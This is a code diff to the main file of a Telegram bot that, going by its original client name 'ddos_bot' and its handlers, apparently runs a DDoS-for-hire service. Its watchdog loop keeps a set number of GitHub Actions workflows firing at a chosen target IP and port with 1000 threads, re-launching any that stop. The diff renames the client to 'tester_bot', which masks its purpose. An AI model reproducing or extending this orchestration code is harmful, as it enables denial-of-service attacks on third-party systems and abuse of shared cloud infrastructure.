@@ -5,7 +5,7 @@ import asyncio
 import threading
 from config import (API_ID, API_HASH, BOT_TOKEN, OWNER_ID, PORT,
                    WORKFLOW_COUNT)
-from services.github import get_all_runs, trigger_workflow
+import state  # shared state - circular import এড়াতে
 
 logging.basicConfig(
     level=logging.INFO,
@@ -13,13 +13,9 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ===== GLOBAL STATE =====
-current_target = {"ip": None, "port": None, "threads": 1000}
-watchdog_enabled = False
-
 # Client
 app = Client(
-    "ddos_bot",
+    "tester_bot",
     api_id=API_ID,
     api_hash=API_HASH,
     bot_token=BOT_TOKEN,
@@ -27,9 +23,9 @@ app = Client(
 )
 
 # ===== REGISTER HANDLERS =====
-from handlers import (start, launch, status, stop, history,
-                      referral, profile, users, settings,
-                      statistics, logs, owner, token, callbacks)
+from handlers import start, launch, status, stop, history
+from handlers import referral, profile, users, settings
+from handlers import statistics, logs, owner, token, callbacks
 
 start.register(app)
 launch.register(app)
@@ -49,35 +45,35 @@ callbacks.register(app)
 # ===== WATCHDOG LOOP =====
 async def watchdog_loop():
     """প্রতি ১ মিনিটে চেক, বন্ধ থাকলে চালু"""
-    global current_target, watchdog_enabled
+    from services.github import get_all_runs, trigger_workflow
     logger.info("🐕 Watchdog started")
-    
+
     while True:
         try:
-            if watchdog_enabled and current_target["ip"]:
-                status = get_all_runs()
-                running = sum(
-                    1 for wf, s in status.items()
+            if state.watchdog_enabled and state.current_target["ip"]:
+                wf_status = get_all_runs()
+                running_count = sum(
+                    1 for wf, s in wf_status.items()
                     if wf.startswith("bot") and s in ["in_progress", "queued"]
                 )
-                
-                if running < WORKFLOW_COUNT:
-                    logger.info(f"⚠️ {running}/{WORKFLOW_COUNT} running, restarting...")
+
+                if running_count < WORKFLOW_COUNT:
+                    logger.info(f"⚠️ {running_count}/{WORKFLOW_COUNT} running, restarting...")
                     for i in range(1, WORKFLOW_COUNT + 1):
                         wf = f"bot{i}.yml"
-                        if status.get(wf) not in ["in_progress", "queued"]:
+                        if wf_status.get(wf) not in ["in_progress", "queued"]:
                             trigger_workflow(
                                 wf,
-                                current_target["ip"],
-                                current_target["port"],
-                                current_target["threads"]
+                                state.current_target["ip"],
+                                state.current_target["port"],
+                                state.current_target["threads"]
                             )
                             await asyncio.sleep(1)
                 else:
-                    logger.info(f"✅ {running}/{WORKFLOW_COUNT} running")
+                    logger.info(f"✅ {running_count}/{WORKFLOW_COUNT} running")
         except Exception as e:
             logger.error(f"Watchdog error: {e}")
-        
+
         await asyncio.sleep(60)
 
 def start_watchdog():
@@ -93,9 +89,9 @@ flask_app = Flask(__name__)
 def health():
     return {
         "status": "alive",
-        "watchdog": watchdog_enabled,
-        "target": f"{current_target['ip']}:{current_target['port']}"
-                  if current_target["ip"] else None
+        "watchdog": state.watchdog_enabled,
+        "target": f"{state.current_target['ip']}:{state.current_target['port']}"
+                  if state.current_target["ip"] else None
     }, 200
 
 @flask_app.route('/health')
